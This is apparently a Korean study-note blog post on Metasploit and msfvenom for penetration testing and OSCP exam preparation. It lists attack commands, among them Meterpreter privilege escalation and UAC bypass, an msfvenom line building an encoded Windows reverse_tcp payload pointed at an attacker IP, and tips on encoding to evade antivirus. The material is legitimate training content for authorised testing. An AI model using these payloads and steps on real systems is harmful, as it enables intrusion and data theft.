---
title:  "Metasploit, Msfvenom"
excerpt: "Metasploit, Msfvenom에 대해 자세히 공부해보자."

categories: tools
tags:
  - [metasploit, Msfvenom]

typora-root-url: ../../
 
date: 2025-08-28
last_modified_at: 2025-08-28
---
# Metasploit 
## 개요
- **Metasploit**은 모의해킹과 침투 테스트에 사용되는 가장 강력하고 널리 사용되는 오픈소스 프레임워크
- 2003년 H.D Moore에 의해 Perl로 개발되기 시작했으며, 현재는 Ruby로 재작성되어 Rapid7에서 소유하고 관리


모듈형 침투 테스트 플랫폼으로서 다음과 같은 기능을 제공
- 취약점 발견 및 악용
- 페이로드 생성 및 전송
- Post-exploitation 기능
- 안티바이러스 우회 및 보안 제어 회피

## Kali Linux 에서 Metasploit 설정
### 기본 설치 확인
Kali Linux에는 Metasploit Framework가 이미 설치되어 있다. 설치 상태를 확인하려면:

```bash
# Metasploit 버전 확인
msfconsole --version

# 데이터베이스 초기화 (PostgreSQL 설정)
sudo msfdb init
```


### 데이터베이스 설정
Metasploit의 모든 기능을 사용하려면 PostgreSQL 데이터베이스 설정이 필요

```bash
# 데이터베이스 시작
sudo msfdb start

# 데이터베이스 상태 확인
sudo msfdb status

# Metasploit 콘솔과 함께 데이터베이스 시작
sudo msfdb run
```

## Metasploit 아키텍처 및 핵심 구성요소

### 1. 모듈 유형 (Module Types)

**Exploit 모듈**
- 시스템의 취약점을 악용하는 코드
- 운영체제별로 분류 (Windows, Linux, Unix, macOS)
- 약 900개 이상의 다양한 exploit 제공

**Payload 모듈**
- **Singles**: 독립적인 페이로드 (self-contained)
- **Stagers**: 네트워크 연결을 설정하는 작은 코드
- **Stages**: Stager에 의해 다운로드되는 더 큰 페이로드 (예: Meterpreter)

**Auxiliary 모듈**
- 스캐닝, 퍼징, 스니핑 등의 보조 기능
- 정보 수집 및 네트워크 Enumeration에 사용

**Post-exploitation 모듈**
- 시스템 장악 후 수행하는 활동
- 권한 상승, 정보 수집, 지속성 확보

### 2. Encoder 및 NOP 모듈
- **Encoders**: 페이로드가 목적지에 온전히 도달하도록 보장
- **NOPs**: 익스플로잇 시도 간 페이로드 크기 일관성 유지



## MSFConsole 기본 사용법

### 콘솔 시작
```bash
# 기본 시작
msfconsole

# 조용한 모드 (배너 없이)
msfconsole -q

# 도움말 확인
msfconsole -h
```

### 핵심 명령어

**검색 및 모듈 선택 예시**
```bash
# 모듈 검색
search [키워드]
search type:exploit
search cve:2021

# 모듈 사용
use exploit/windows/smb/ms08_067_netapi

# 이전 컨텍스트로 돌아가기
back

# 모듈 정보 확인
info
```

**옵션 설정 예시**
```bash
# 옵션 확인
options
show options

# 변수 설정
set RHOSTS 192.168.1.100
set LHOST 192.168.1.50

# 페이로드 선택
set PAYLOAD windows/meterpreter/reverse_tcp

# 모듈 실행
run
exploit
```

**세션 관리**
```bash
# 활성 세션 확인
sessions

# 세션 상호작용
sessions -i 1

# 세션을 백그라운드로
background
```


## Post-exploitation

Meterpreter 세션에서 수행할 수 있는 주요 활동:

### 정보 수집
```bash
# 시스템 정보
meterpreter> sysinfo

# 사용자 정보
meterpreter> getuid

# 네트워크 정보
meterpreter> ifconfig

# 프로세스 목록
meterpreter> ps
```

### 권한 상승
```bash
# getsystem 시도
meterpreter> getsystem

# UAC 우회 모듈 사용
run post/windows/escalate/bypassuac
```

### 파일 시스템 탐색
```bash
# 디렉토리 변경
meterpreter> cd C:\

# 파일 목록
meterpreter> ls

# 파일 다운로드
meterpreter> download filename.txt
```

# msfvenom

msfvenom은 Metasploit 프레임워크의 **페이로드 및 악성코드 생성 도구**로, 익스플로잇 공격에 필요한 실행 파일, 스크립트, 셸코드 등을 다양한 플랫폼과 포맷으로 만들 수 있다.

## msfvenom 주요 기능과 옵션

- **페이로드 생성**: shell, meterpreter, reverse/bind tcp 등 수백 가지 페이로드를 생성 가능
- **다양한 포맷 지원**: exe, elf, python, c, bash, ruby 등으로 출력 가능
- **인코딩 및 크기 제한**: 안티바이러스 우회, 분석방해 목적의 인코더/노프슬레드 적용
- **파일 주입/템플릿 활용**: 기존 실행파일에 악성코드 주입 가능

### 주요 옵션

| 옵션    | 설명               |
|---------|-------------------|
| -p      | 페이로드 지정      |
| -f      | 출력 포맷 지정     |
| -o      | 저장 파일명 지정   |
| -e      | 인코더 지정        |
| -i      | 인코딩 횟수        |
| -a      | 아키텍처           |
| --platform | 운영체제        |
| -b      | 제외할 바이트      |
| -l      | 페이로드, 인코더 등 목록 |
| --help-formats | 지원 포맷 목록 |
| -h      | 도움말             |

### 사용 예시

```bash
# 윈도우 reverse_tcp 페이로드와 인코더 적용, exe 파일로 생성
msfvenom -p windows/meterpreter/reverse_tcp LHOST=공격자IP LPORT=4444 -e x86/shikata_ga_nai -i 3 -f exe -o payload.exe
```
- **-p** : 페이로드 종류 지정
- **-e** : 인코딩 방식(예시: x86/shikata_ga_nai)
- **-i** : 인코딩 횟수(숫자만큼 반복 인코딩)
- **-f** : 출력 포맷 지정(exe, python 등)
- **-o** : 결과파일 저장명

### 사용 순서

1. Kali에서 msfvenom 명령으로 페이로드 실행파일 제작
2. msfconsole에서 `exploit/multi/handler`로 리스너 설정(LHOST/LPORT 동일하게)
3. 피해자 PC에서 생성된 파일(payload.exe 등) 실행 → 공격자 PC에 reverse 연결로 Meterpreter 세션 획득

### 실전 활용 팁

- **-l all** 옵션으로 모든 페이로드/인코더/노프 종류 확인.
- 지원되는 파일 포맷은 **--help-formats**로 확인 가능.
- 인코딩 횟수(-i)를 높이면 AV 우회성 증가. 단, 크기가 커질 수 있음.
- **취약점 증명용 shellcode**, 익스플로잇 코드에 내장 등 실무 활용이 매우 다양함.




## 참고: OSCP 시험에서의 Metasploit 제한사항

OSCP 시험에서는 Metasploit 사용에 **엄격한 제한**이 있다.

### 허용되는 사용
- **하나의 타겟 머신에 대해서만** Metasploit 모듈 (Auxiliary, Exploit, Post) 및 Meterpreter 사용 가능
- 선택한 타겟에서는 무제한 사용 가능
- **msfvenom**은 모든 머신에 대해 사용 가능
- **multi/handler**는 모든 머신에 대해 사용 가능

### 금지사항
- 여러 머신에 대한 Metasploit 사용
- 한 머신에서 실패 시 다른 머신에 사용 불가
- Pivoting 목적의 Metasploit 사용 금지
- 취약점 테스트를 위한 **check** 기능 사용 금지



## 학습 리소스

- **Metasploit Unleashed**: Offensive Security에서 제공하는 무료 온라인 강의
- **공식 문서**: Rapid7의 Metasploit 문서
- **실습 환경**: Proving Grounds Practice, HackTheBox, VulnHub

